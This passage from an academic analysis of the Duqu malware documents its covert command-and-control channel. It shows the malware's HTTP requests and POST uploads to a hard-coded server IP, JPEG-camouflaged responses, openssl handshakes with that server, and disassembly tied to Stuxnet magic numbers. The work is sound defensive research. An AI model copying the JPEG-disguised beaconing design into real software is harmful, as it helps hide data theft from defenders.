on this page has not been written by Symantec, \n\n\n-----\n\n#### 12.2. Communication module\n\n###### The discovered Duqu payload contains a Command and Control, or more precisely a backdoor covert channel control communication module. (It’s goal is most likely not just simple telling “commands”, but rather like RDP or VNC like functionality extended with proxy functions and file transfer or such, but this is partly just speculation.)\n\n In our case the communication is done with 206.183.111.97, which is up and running for months and still running at the time of writing this document. The communication protocol uses both HTTP port 80, and HTTPS port 443. We present a first analysis with initial samples, but further investigations are required to fully understand the communication protocol. \n\n 12.2.1. Communication protocol\n\n For port 443, binary traffic can be observed. Among the first bytes of the traffic, we see the characters “SH” most of the time, for both sides, and multiple times the observed string is “53 48 b8 50 57” (SH<b8>PW).\n\n For port 80, the traffic shows a distinct form. First, the victim computer starts the communication in the following form:\n\n GET / HTTP/1.1 Cookie: PHPSESSID=gsc46y0u9mok0g27ji11jj1w22 Cache-Control: no-cache Pragma: no-cache User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 (.NET CLR 3.5.30729) Host: 206.183.111.97 Connection: Keep-Alive\n\n Sample 24 – HTTP communication protocol HTTP query header\n\n The PHP session ID is of course fabricated and generated by the communication module. The User Agent is static and as it is very specific (rarely observed in the wild), providing a possibility to create specific matching signature e.g. in IDS tools. \n\n The IP address seems to be constant, and it is hard coded to the PNF file in multiple times (once as a UTF‐8 IP string, and twice as hex binaries).\n\n After sending out the HTTP header, the server begins the answer by sending back a jpeg file (seems to be a 100x100 empty jpeg), most likely for deception and to avoid firewall problems: \n\n00000000 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d HTTP/1.1 200 OK.\n00000010 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 69 .Content -Type: i\n00000020 6d 61 67 65 2f 6a 70 65 67 0d 0a 54 72 61 6e 73 mage/jpe g..Trans\n\n###### 38 The content on this page has not been written by Symantec, \n\n\n-----\n\n00000030 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 fer-Enco ding: ch\n00000040 75 6e 6b 65 64 0d 0a 43 6f 6e 6e 65 63 74 69 6f unked..C onnectio\n00000050 6e 3a 20 43 6c 6f 73 65 0d 0a 0d 0a       n: Close ....\n0000005C 32 45 30 0d 0a ff d8 ff e0 00 10 4a 46 49 46 00 2E0..... ...JFIF.\n0000006C 01 01 01 00 60 00 60 00 00 ff db 00 43 00 02 01 ....`.`. ....C...\n0000007C 01 02 01 01 02 02 02 02 02 02 02 02 03 05 03 03 ........ ........\n0000008C 03 03 03 06 04 04 03 05 07 06 07 07 07 06 07 07 ........ ........\n0000009C 08 09 0b 09 08 08 0a 08 07 07 0a 0d 0a 0a 0b 0c ........ ........\n000000AC 0c 0c 0c 07 09 0e 0f 0d 0c 0e 0b 0c 0c 0c ff db ........ ........\n000000BC 00 43 01 02 02 02 03 03 03 06 03 03 06 0c 08 07 .C...... ........\n000000CC 08 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c ........ ........\n000000DC 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c ........ ........\n000000EC 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c ........ ........\n000000FC 0c 0c 0c ff c0 00 11 08 00 36 00 36 03 01 22 00 ........ .6.6..\".\n0000010C 02 11 01 03 11 01 ff c4 00 1f 00 00 01 05 01 01 ........ ........\n0000011C 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 ........ ........\n0000012C 05 06 07 08 09 0a 0b ff c4 00 b5 10 00 02 01 03 ........ ........\n0000013C 03 02 04 03 05 05 04 04 00 00 01 7d 01 02 03 00 ........ ...}....\n0000014C 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 ....!1A. .Qa.\"q.2\n0000015C 81 91 a1 08 23 42 b1 c1 15 52 d1 f0 24 33 62 72 ....#B.. .R..$3br\n0000016C 82 09 0a 16 17 18 19 1a 25 26 27 28 29 2a 34 35 ........ %&'()*45\n0000017C 36 37 38 39 3a 43 44 45 46 47 48 49 4a 53 54 55 6789:CDE FGHIJSTU\n0000018C 56 57 58 59 5a 63 64 65 66 67 68 69 6a 73 74 75 VWXYZcde fghijstu\n0000019C 76 77 78 79 7a 83 84 85 86 87 88 89 8a 92 93 94 vwxyz... ........\n000001AC 95 96 97 98 99 9a a2 a3 a4 a5 a6 a7 a8 a9 aa b2 ........ ........\n000001BC b3 b4 b5 b6 b7 b8 b9 ba c2 c3 c4 c5 c6 c7 c8 c9 ........ ........\n000001CC ca d2 d3 d4 d5 d6 d7 d8 d9 da e1 e2 e3 e4 e5 e6 ........ ........\n000001DC e7 e8 e9 ea f1 f2 f3 f4 f5 f6 f7 f8 f9 fa ff c4 ........ ........\n000001EC 00 1f 01 00 03 01 01 01 01 01 01 01 01 01 00 00 ........ ........\n000001FC 00 00 00 00 01 02 03 04 05 06 07 08 09 0a 0b ff ........ ........\n0000020C c4 00 b5 11 00 02 01 02 04 04 03 04 07 05 04 04 ........ ........\n0000021C 00 01 02 77 00 01 02 03 11 04 05 21 31 06 12 41 ...w.... ...!1..A\n0000022C 51 07 61 71 13 22 32 81 08 14 42 91 a1 b1 c1 09 Q.aq.\"2. ..B.....\n0000023C 23 33 52 f0 15 62 72 d1 0a 16 24 34 e1 25 f1 17 #3R..br. ..$4.%..\n0000024C 18 19 1a 26 27 28 29 2a 35 36 37 38 39 3a 43 44 ...&'()* 56789:CD\n0000025C 45 46 47 48 49 4a 53 54 55 56 57 58 59 5a 63 64 EFGHIJST UVWXYZcd\n0000026C 65 66 67 68 69 6a 73 74 75 76 77 78 79 7a 82 83 efghijst uvwxyz..\n0000027C 84 85 86 87 88 89 8a 92 93 94 95 96 97 98 99 9a ........ ........\n0000028C a2 a3 a4 a5 a6 a7 a8 a9 aa b2 b3 b4 b5 b6 b7 b8 ........ ........\n0000029C b9 ba c2 c3 c4 c5 c6 c7 c8 c9 ca d2 d3 d4 d5 d6 ........ ........\n000002AC d7 d8 d9 da e2 e3 e4 e5 e6 e7 e8 e9 ea f2 f3 f4 ........ ........\n000002BC f5 f6 f7 f8 f9 fa ff da 00 0c 03 01 00 02 11 03 ........ ........\n000002CC 11 00 3f 00 fd fc a2 8a 28 00 a2 8a 28 00 a2 8a ..?..... (...(...\n000002DC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n000002EC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n000002FC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n0000030C 28 00 a2 8a 28 03 ff d9 53 48 c0 a7 26 7b 00 22 (...(... SH..&{.\"\n0000031C 00 01 00 00 14 10 00 00 00 01 00 00 00 3e 96 19 ........ .....>..\n0000032C 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n\n###### Sample 25 – beginning of the transmission from the C&C server – a JPEG + extras\n\n 39 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### Sometimes the client sends a JPEG image in the query as well, which is always named as DSC00001.jpg (hard coded in the binary) as follows in the sample below.\n\nPOST / HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nContent-Type: multipart/form-data; boundary=---------------------------77eb5cc2cc0add\nCookie: PHPSESSID=<some id removed here>\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 (.NET\nCLR 3.5.30729)\nContent-Length: 891\nHost: 206.183.111.97\n\n---------------------------<some id>\nContent-Disposition: form-data; name=\"DSC00001.jpg\"\nContent-Type: image/jpeg\n\n......JFIF.....`.`.....C.........................................\n...\n.........\n.........C.......................................................................6.6..\"....................\n..................\n.....................}........!1A..Qa.\"q.2....#B...R..$3br..\n.....%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz.........................................................\n...............................................\n.....................w.......!1..AQ.aq.\"2...B.....#3R..br.\n.$4.%.....&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwx\n\n###### Sample 26 – beginning of the transmission with JPEG upload\n\n The communication can be reproduced in telnet. In this case, it can be clearly seen that after sending back the JPEG, the other end starts to send out some binary data, and because it remains unanswered, the other end closes down the channel. We illustrate this emulation in the following sample log.\n\n…\n000002CC 11 00 3f 00 fd fc a2 8a 28 00 a2 8a 28 00 a2 8a ..?..... (...(...\n000002DC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n000002EC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n000002FC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n0000030C 28 00 a2 8a 28 03 ff d9 53 48 c0 a7 26 7b 00 22 (...(... SH..&{.\"\n0000031C 00 01 00 00 14 10 00 00 00 01 00 00 00 3e 96 19 ........ .....>..\n0000032C 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n0000033C 00 02 00 00 00 0d 0a               .......\n00000343 31 31 0d 0a 0c 00 00 00 00 02 00 00 00 3e 96 19 11...... .....>..\n00000353 00 00 00 00 20 0d 0a               .... ..\n0000035A 32 31 0d 0a 14 10 00 00 00 01 00 00 00 3e 96 19 21...... .....>..\n0000036A 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n0000037A 00 02 00 00 00 0d 0a               .......\n00000381 31 31 0d 0a 0c 00 00 00 00 02 00 00 00 3e 96 19 11...... .....>..\n00000391 00 00 00 00 20 0d 0a               .... ..\n00000398 32 31 0d 0a 14 10 00 00 00 01 00 00 00 3e 96 19 21...... .....>..\n000003A8 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n000003B8 00 02 00 00 00 0d 0a               .......\n000003BF 31 31 0d 0a 0c 00 00 00 00 02 00 00 00 3e 96 19 11...... .....>..\n000003CF 00 00 00 00 20 0d 0a               .... ..\n000003D6 32 31 0d 0a 14 10 00 00 00 01 00 00 00 3e 96 19 21...... .....>..\n000003E6 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n000003F6 00 02 00 00 00 0d 0a               .......\n000003FD 31 31 0d 0a 0c 00 00 00 00 02 00 00 00 3e 96 19 11...... .....>..\n0000040D 00 00 00 00 20 0d 0a               .... ..\n00000414 32 31 0d 0a 14 10 00 00 00 01 00 00 00 3e 96 19 21...... .....>..\n00000424 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n00000434 00 02 00 00 00 0d 0a               .......\n\n###### 40 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### Sample 27 – continuation of the traffic without proper client in multiple packets\n\n 12.2.2. Information on the SSL connection\n\n We don’t know too much about the traffic on SSL port yet, but it seems that both parties use self‐signed certificates. It is possible, however, to connect to the server without client certificate. The server certificate has been changed over the time, most likely it is auto‐ regenerated in specific intervals.\n\n$ openssl s_client -host 206.183.111.97 -port 443 -msg\nCONNECTED(00000003)\n>>> SSL 2.0 [length 0077], CLIENT-HELLO\n01 03 01 00 4e 00 00 00 20 00 00 39 00 00 38 00\n00 35 00 00 16 00 00 13 00 00 0a 07 00 c0 00 00\n33 00 00 32 00 00 2f 03 00 80 00 00 05 00 00 04\n01 00 80 00 00 15 00 00 12 00 00 09 06 00 40 00\n00 14 00 00 11 00 00 08 00 00 06 04 00 80 00 00\n03 02 00 80 00 00 ff d2 f0 15 f8 da cb cb ce e8\nc9 eb 60 23 34 93 98 c5 72 8b 22 c9 9f b8 1d e4\n96 23 4e 88 08 5e 2c\n19605:error:140790E5:SSL routines:SSL23_WRITE:ssl handshake failure:s23_lib.c:188:\n\n[SSL2 is not supported]\n\n$ openssl s_client -host 206.183.111.97 -port 443 -msg -tls1\nCONNECTED(00000003)\n>>> TLS 1.0 Handshake [length 005a], ClientHello\n01 00 00 56 03 01 4e 91 da 29 e3 8b 9e 68 2f 4f\n0d a8 30 ee 1c d5 fc dc cb f9 ae 33 6a 6f cb ff\n80 6d 2a 34 5c 88 00 00 28 00 39 00 38 00 35 00\n16 00 13 00 0a 00 33 00 32 00 2f 00 05 00 04 00\n15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00\nff 02 01 00 00 04 00 23 00 00\n<<< TLS 1.0 Handshake [length 004a], ServerHello\n02 00 00 46 03 01 4e 92 48 ab 35 d9 05 8d 47 9a\n8e 0c 4f fd b3 64 bb 18 f5 74 2a a1 36 45 08 cd\ne1 b7 5f d0 a2 37 20 90 1e 00 00 fb f7 cf 4e f0\n6d 26 95 ec 69 68 fa e7 1b ca 84 1f 0b 4f fd 2c\nb0 69 90 01 a8 a3 0e 00 2f 00\n<<< TLS 1.0 Handshake [length 0125], Certificate\n0b 00 01 21 00 01 1e 00 01 1b 30 82 01 17 30 81\nc2 a0 03 02 01 02 02 10 40 2b 57 d9 61 5a c5 b8\n40 a1 04 19 e6 c0 c9 d5 30 0d 06 09 2a 86 48 86\nf7 0d 01 01 05 05 00 30 0d 31 0b 30 09 06 03 55\n04 03 1e 02 00 2a 30 1e 17 0d 31 30 30 31 30 31\n31 36 30 30 30 30 5a 17 0d 32 30 30 31 30 31 31\n36 30 30 30 30 5a 30 0d 31 0b 30 09 06 03 55 04\n03 1e 02 00 2a 30 5c 30 0d 06 09 2a 86 48 86 f7\n0d 01 01 01 05 00 03 4b 00 30 48 02 41 00 d1 da\nd2 94 78 ee a2 56 96 88 14 d0 38 49 36 9e 0f 1b\n17 71 42 7a 32 01 42 b4 17 3e 40 87 cb c1 bd 94\n62 f6 f8 f9 42 53 34 78 a9 f9 01 50 8f 39 f0 2c\nf4 36 dd 24 74 26 86 79 11 38 94 78 81 35 02 03\n01 00 01 30 0d 06 09 2a 86 48 86 f7 0d 01 01 05\n05 00 03 41 00 5c a4 39 a8 45 98 2a a9 97 05 77\n63 2b 31 d7 96 bc b4 9f 0a dd bd 25 e4 1f dd e1\nbe c4 3c 08 56 31 6a 3d 23 f5 dc b1 5a 78 fe 34\na6 c5 91 d0 92 f6 28 f4 d9 61 eb 1a 5a 98 44 2a\na9 30 a2 46 e3\ndepth=0 /CN=\\x00*\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 /CN=\\x00*\nverify return:1\n<<< TLS 1.0 Handshake [length 0004], ServerHelloDone\n0e 00 00 00\n\n###### 41 The content on this page has not been written by Symantec, \n\n|self‐signed certificates. It is possible, however, to connect to the server without client certificate. The server certificate has been changed over the time, most likely it is auto‐ regenerated in specific intervals.|Col2|Col3|\n|---|---|---|\n||||\n|$ openssl s_client -host 206.183.111.97 -port 443 -msg CONNECTED(00000003) >>> SSL 2.0 [length 0077], CLIENT-HELLO 01 03 01 00 4e 00 00 00 20 00 00 39 00 00 38 00 00 35 00 00 16 00 00 13 00 00 0a 07 00 c0 00 00 33 00 00 32 00 00 2f 03 00 80 00 00 05 00 00 04 01 00 80 00 00 15 00 00 12 00 00 09 06 00 40 00 00 14 00 00 11 00 00 08 00 00 06 04 00 80 00 00 03 02 00 80 00 00 ff d2 f0 15 f8 da cb cb ce e8 c9 eb 60 23 34 93 98 c5 72 8b 22 c9 9f b8 1d e4 96 23 4e 88 08 5e 2c 19605:error:140790E5:SSL routines:SSL23_WRITE:ssl handshake failure:s23_lib.c:188: [SSL2 is not supported] $ openssl s_client -host 206.183.111.97 -port 443 -msg -tls1 CONNECTED(00000003) >>> TLS 1.0 Handshake [length 005a], ClientHello 01 00 00 56 03 01 4e 91 da 29 e3 8b 9e 68 2f 4f 0d a8 30 ee 1c d5 fc dc cb f9 ae 33 6a 6f cb ff 80 6d 2a 34 5c 88 00 00 28 00 39 00 38 00 35 00 16 00 13 00 0a 00 33 00 32 00 2f 00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff 02 01 00 00 04 00 23 00 00 <<< TLS 1.0 Handshake [length 004a], ServerHello 02 00 00 46 03 01 4e 92 48 ab 35 d9 05 8d 47 9a 8e 0c 4f fd b3 64 bb 18 f5 74 2a a1 36 45 08 cd e1 b7 5f d0 a2 37 20 90 1e 00 00 fb f7 cf 4e f0 6d 26 95 ec 69 68 fa e7 1b ca 84 1f 0b 4f fd 2c b0 69 90 01 a8 a3 0e 00 2f 00 <<< TLS 1.0 Handshake [length 0125], Certificate 0b 00 01 21 00 01 1e 00 01 1b 30 82 01 17 30 81 c2 a0 03 02 01 02 02 10 40 2b 57 d9 61 5a c5 b8 40 a1 04 19 e6 c0 c9 d5 30 0d 06 09 2a 86 48 86 f7 0d 01 01 05 05 00 30 0d 31 0b 30 09 06 03 55 04 03 1e 02 00 2a 30 1e 17 0d 31 30 30 31 30 31 31 36 30 30 30 30 5a 17 0d 32 30 30 31 30 31 31 36 30 30 30 30 5a 30 0d 31 0b 30 09 06 03 55 04 03 1e 02 00 2a 30 5c 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 4b 00 30 48 02 41 00 d1 da d2 94 78 ee a2 56 96 88 14 d0 38 49 36 9e 0f 1b 17 71 42 7a 32 01 42 b4 17 3e 40 87 cb c1 bd 94 62 f6 f8 f9 42 53 34 78 a9 f9 01 50 8f 39 f0 2c f4 36 dd 24 74 26 86 79 11 38 94 78 81 35 02 03 01 00 01 30 0d 06 09 2a 86 48 86 f7 0d 01 01 05 05 00 03 41 00 5c a4 39 a8 45 98 2a a9 97 05 77 63 2b 31 d7 96 bc b4 9f 0a dd bd 25 e4 1f dd e1 be c4 3c 08 56 31 6a 3d 23 f5 dc b1 5a 78 fe 34 a6 c5 91 d0 92 f6 28 f4 d9 61 eb 1a 5a 98 44 2a a9 30 a2 46 e3 depth=0 /CN=\\x00* verify error:num=18:self signed certificate verify return:1 depth=0 /CN=\\x00* verify return:1 <<< TLS 1.0 Handshake [length 0004], ServerHelloDone 0e 00 00 00|||\n\n\n-----\n\n>>> TLS 1.0 Handshake [length 0046], ClientKeyExchange\n10 00 00 42 00 40 a0 a3 36 08 e6 3d 25 b0 93 06\n62 15 9d 3f ad b3 9c 9b e3 ee 87 23 37 e6 d2 8a\n9e d0 0f af 1d fa 04 7e 66 e8 79 c5 71 3d 13 39\neb 7b 13 17 7c 91 e1 16 14 44 59 57 df df 69 50\nbc 47 32 1b 87 35\n>>> TLS 1.0 ChangeCipherSpec [length 0001]\n01\n>>> TLS 1.0 Handshake [length 0010], Finished\n14 00 00 0c 1e e5 b8 c5 25 ef 03 8a 11 6f e3 c4\n<<< TLS 1.0 ChangeCipherSpec [length 0001]\n01\n<<< TLS 1.0 Handshake [length 0010], Finished\n14 00 00 0c 46 e2 18 8a 4e 09 3d 41 45 26 c6 ba\n--Certificate chain\n0 s:/CN=\\x00*\ni:/CN=\\x00*\n--Server certificate\n-----BEGIN CERTIFICATE----MIIBFzCBwqADAgECAhBAK1fZYVrFuEChBBnmwMnVMA0GCSqGSIb3DQEBBQUAMA0x\nCzAJBgNVBAMeAgAqMB4XDTEwMDEwMTE2MDAwMFoXDTIwMDEwMTE2MDAwMFowDTEL\nMAkGA1UEAx4CACowXDANBgkqhkiG9w0BAQEFAANLADBIAkEA0drSlHjuolaWiBTQ\nOEk2ng8bF3FCejIBQrQXPkCHy8G9lGL2+PlCUzR4qfkBUI858Cz0Nt0kdCaGeRE4\nlHiBNQIDAQABMA0GCSqGSIb3DQEBBQUAA0EAXKQ5qEWYKqmXBXdjKzHXlry0nwrd\nvSXkH93hvsQ8CFYxaj0j9dyxWnj+NKbFkdCS9ij02WHrGlqYRCqpMKJG4w==\n-----END CERTIFICATE----subject=/CN=\\x00*\nissuer=/CN=\\x00*\n--No client certificate CA names sent\n--SSL handshake has read 435 bytes and written 229 bytes\n--New, TLSv1/SSLv3, Cipher is AES128-SHA\nServer public key is 512 bit\nSecure Renegotiation IS NOT supported\nCompression: NONE\nExpansion: NONE\nSSL-Session:\nProtocol : TLSv1\nCipher  : AES128-SHA\nSession-ID: 901E0000FBF7CF4EF06D2695EC6968FAE71BCA841F0B4FFD2CB0699001A8A30E\nSession-ID-ctx:\nMaster-Key:\nCBE2283F0192B1E928DDA4E21471BA27655EBB626EC807FBE80CA284AE8BC68AFD49349750EBF7010896B1BD04050D18\nKey-Arg  : None\nStart Time: 1318181417\nTimeout  : 7200 (sec)\nVerify return code: 18 (self signed certificate)\n--\n###### Sample 28 – TLS communication with the C&C server\n\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number:\n40:2b:57:d9:61:5a:c5:b8:40:a1:04:19:e6:c0:c9:d5\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: CN=\\x00*\nValidity\nNot Before: Jan 1 16:00:00 2010 GMT\nNot After : Jan 1 16:00:00 2020 GMT\nSubject: CN=\\x00*\nSubject Public Key Info:\nPublic Key Algorithm: rsaEncryption\nRSA Public Key: (512 bit)\nModulus (512 bit):\n00:d1:da:d2:94:78:ee:a2:56:96:88:14:d0:38:49:\n\n###### 42 The content on this page has not been written by Symantec, \n\n\n-----\n\n36:9e:0f:1b:17:71:42:7a:32:01:42:b4:17:3e:40:\n87:cb:c1:bd:94:62:f6:f8:f9:42:53:34:78:a9:f9:\n01:50:8f:39:f0:2c:f4:36:dd:24:74:26:86:79:11:\n38:94:78:81:35\nExponent: 65537 (0x10001)\nSignature Algorithm: sha1WithRSAEncryption\n5c:a4:39:a8:45:98:2a:a9:97:05:77:63:2b:31:d7:96:bc:b4:\n9f:0a:dd:bd:25:e4:1f:dd:e1:be:c4:3c:08:56:31:6a:3d:23:\nf5:dc:b1:5a:78:fe:34:a6:c5:91:d0:92:f6:28:f4:d9:61:eb:\n1a:5a:98:44:2a:a9:30:a2:46:e3\n\n###### Sample 29 – Server certificate details\n\n$ openssl s_client -host 206.183.111.97 -port 443 -msg -ssl3\nCONNECTED(00000003)\n>>> SSL 3.0 Handshake [length 0054], ClientHello\n01 00 00 50 03 00 4e 91 da d9 df fe e2 42 d8 bb\n6a 96 54 35 88 d3 75 87 cb a2 80 6c 83 22 32 c6\n00 b5 53 c5 30 bb 00 00 28 00 39 00 38 00 35 00\n16 00 13 00 0a 00 33 00 32 00 2f 00 05 00 04 00\n15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00\nff 02 01 00\n<<< SSL 3.0 Handshake [length 004a], ServerHello\n02 00 00 46 03 00 4e 92 49 5c cc e0 3b 46 4a 34\n72 e2 51 e6 05 29 4e 13 c4 6f 58 66 bc 3d ab cd\nd9 5a eb 24 a1 32 20 60 0e 00 00 99 82 81 bb 47\nab fc 23 79 06 07 7f 11 6f 0a fd b0 9a 56 03 ab\n78 2e 6e 13 09 9e e5 00 05 00\n<<< SSL 3.0 Handshake [length 0125], Certificate\n0b 00 01 21 00 01 1e 00 01 1b 30 82 01 17 30 81\nc2 a0 03 02 01 02 02 10 4e f6 48 35 85 40 75 ac\n47 41 32 d4 dc e9 d0 9c 30 0d 06 09 2a 86 48 86\nf7 0d 01 01 05 05 00 30 0d 31 0b 30 09 06 03 55\n04 03 1e 02 00 2a 30 1e 17 0d 31 30 30 31 30 31\n31 36 30 30 30 30 5a 17 0d 32 30 30 31 30 31 31\n36 30 30 30 30 5a 30 0d 31 0b 30 09 06 03 55 04\n03 1e 02 00 2a 30 5c 30 0d 06 09 2a 86 48 86 f7\n0d 01 01 01 05 00 03 4b 00 30 48 02 41 00 d1 da\nd2 94 78 ee a2 56 96 88 14 d0 38 49 36 9e 0f 1b\n17 71 42 7a 32 01 42 b4 17 3e 40 87 cb c1 bd 94\n62 f6 f8 f9 42 53 34 78 a9 f9 01 50 8f 39 f0 2c\nf4 36 dd 24 74 26 86 79 11 38 94 78 81 35 02 03\n01 00 01 30 0d 06 09 2a 86 48 86 f7 0d 01 01 05\n05 00 03 41 00 7a 26 43 86 75 49 c2 15 4e ed 5b\ncd ed ae 24 06 56 f2 04 dd 77 b2 e1 48 05 4e 9f\n2f a8 be 38 71 49 c9 0d b6 a0 ec 77 ea e4 a3 8c\ned 0b b7 7c 36 a5 71 0f d8 57 c3 94 17 dd f7 ea\n65 0d 7c 79 66\ndepth=0 /CN=\\x00*\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 /CN=\\x00*\nverify return:1\n<<< SSL 3.0 Handshake [length 0004], ServerHelloDone\n0e 00 00 00\n>>> SSL 3.0 Handshake [length 0044], ClientKeyExchange\n10 00 00 40 96 85 20 da bd 3c ea 13 d8 7d b3 86\n6e 7c 9e 86 76 53 dc 59 ae 47 e8 67 99 23 68 8a\n35 aa 3f 77 13 3f b0 78 a1 64 d5 fc f6 11 93 b9\n0e 49 06 7f a1 bf 24 bf ab 8b 3b 5a 35 3c 69 ba\ne5 22 f7 5a\n>>> SSL 3.0 ChangeCipherSpec [length 0001]\n01\n>>> SSL 3.0 Handshake [length 0028], Finished\n14 00 00 24 5a 1d d0 06 ad 66 19 5d 46 a9 f0 03\n61 3a a1 0d e9 56 8a 19 c5 7e 91 11 80 db 6a 42\nb2 18 14 98 2b fd b6 48\n<<< SSL 3.0 ChangeCipherSpec [length 0001]\n01\n<<< SSL 3.0 Handshake [length 0028], Finished\n14 00 00 24 d3 40 5a ec b8 26 6d d5 10 7d 58 17\n29 83 ca b9 8c 31 3e 80 54 4d 12 ba 7e bc 8b b1\n68 ab 47 04 d2 b9 67 ca\n--\n###### 43 The content on this page has not been written by Symantec, \n\n\n-----\n\nCertificate chain\n0 s:/CN=\\x00*\ni:/CN=\\x00*\n--Server certificate\n-----BEGIN CERTIFICATE----MIIBFzCBwqADAgECAhBO9kg1hUB1rEdBMtTc6dCcMA0GCSqGSIb3DQEBBQUAMA0x\nCzAJBgNVBAMeAgAqMB4XDTEwMDEwMTE2MDAwMFoXDTIwMDEwMTE2MDAwMFowDTEL\nMAkGA1UEAx4CACowXDANBgkqhkiG9w0BAQEFAANLADBIAkEA0drSlHjuolaWiBTQ\nOEk2ng8bF3FCejIBQrQXPkCHy8G9lGL2+PlCUzR4qfkBUI858Cz0Nt0kdCaGeRE4\nlHiBNQIDAQABMA0GCSqGSIb3DQEBBQUAA0EAeiZDhnVJwhVO7VvN7a4kBlbyBN13\nsuFIBU6fL6i+OHFJyQ22oOx36uSjjO0Lt3w2pXEP2FfDlBfd9+plDXx5Zg==\n-----END CERTIFICATE----subject=/CN=\\x00*\nissuer=/CN=\\x00*\n--No client certificate CA names sent\n--SSL handshake has read 447 bytes and written 233 bytes\n--New, TLSv1/SSLv3, Cipher is RC4-SHA\nServer public key is 512 bit\nSecure Renegotiation IS NOT supported\nCompression: NONE\nExpansion: NONE\nSSL-Session:\nProtocol : SSLv3\nCipher  : RC4-SHA\nSession-ID: 600E0000998281BB47ABFC237906077F116F0AFDB09A5603AB782E6E13099EE5\nSession-ID-ctx:\nMaster-Key:\n73917F3FEF0B57C67098302F43162B977F4E8A16846C75A051B0623104FCDD0270F97B3F78A30D9ADACBD0CA190BA3CA\nKey-Arg  : None\nStart Time: 1318181593\nTimeout  : 7200 (sec)\nVerify return code: 18 (self signed certificate)\n\n###### Sample 30 – Another handshake with SSLv3 (server certificate remains the same)\n\n## 13. Relations to other papers\n\n###### Some papers including [SymantecDossier] identified 0x19790509 as an important magic string used in Stuxnet. However, they don’t mention the magic string 0xAE790509 found in the beginning of the Stuxnet configuration file (and Duqu as well). The two numbers only differ in the first character. In the code below, there is another magic string 0xAE1979DD copied from Stuxnet DLL dropper. This seems to be interesting.\n\n The other interesting magic is 0xAE. In Duqu, 0xAE comes up at many different places, so does for Stuxnet. As described above, it’s part of the magic in the config file, and both Duqu and Stuxnet uses 0xAE240682 for configuration file encryption. For Stuxnet, some payload is encrypted with 0x01AE0000 and 0x02AE0000. The bzip2 encoded parts of the keylogger log file have a magic “AEh91AY “BZh91AY…”, so again AE is the magic modification (note, however, that some other affected bzip2 compressed files begin with “ABh91AY”) The question is, if Duqu just reuses parts of the Stuxnet code and the author does not closely relates to the Stuxnet authors, why both use 0xAE so often?\n\n100016BA E86B090000 call SUB_L1000202A\n100016BF 83C40C add esp,0000000Ch\n100016C2 8D4580 lea eax,[ebp-80h]\n\n###### 44 The content on this page has not been written by Symantec, \n\n\n-----\n\n100016C5 35DD7919AE xor eax,AE1979DDh\n100016CA 33C9 xor ecx,ecx\n100016CC 894580 mov [ebp-80h],eax\n100016CF 894D84 mov [ebp-7Ch],ecx\n100016D2 8B4508 mov eax,[ebp+08h]\n100016D5 8B4008 mov eax,[eax+08h]\n100016D8 051A1F0010 add eax,L10001F1A\n\n###### Sample 31 – Some AE magic number from Stuxnet payload DLL\n\n.text:10002534 loc_10002534:              ; CODE XREF: general_handler_1000244C+EA�j\n.text:10002534         xor   eax, eax\n.text:10002536         jnz   short loc_10002534\n.text:10002538\n.text:10002538 loc_10002538:              ; CODE XREF: general_handler_1000244C+37�j\n.text:10002538         mov   eax, [ebp+arg_0]\n.text:1000253B         xor   eax, 0AE1979DDh\n.text:10002540         xor   ecx, ecx\n.text:10002542         mov   edx, [ebp+arg_0]\n.text:10002545         mov   [edx], eax\n.text:10002547         mov   [edx+4], ecx\n.text:1000254A         xor   eax, eax\n.text:1000254C\n.text:1000254C loc_1000254C:              ; CODE XREF: general_handler_1000244C+1E�j\n.text:1000254C                     ; general_handler_1000244C+D5�j\n.text:1000254C         pop   esi\n.text:1000254D         leave\n.text:1000254E         retn\n.text:1000254E general_handler_1000244C endp\n\n###### Sample 32 – Duqu payload Res302 magic string at general handler\n\n## 14.Unanswered questions\n\n###### Our goal was to make an initial analysis that raises attention to this case of targeted malware. As we are in academia, we have limited resources to analyze malware behavior. That means we leave several questions for further investigation. We collected some of these questions to inspire 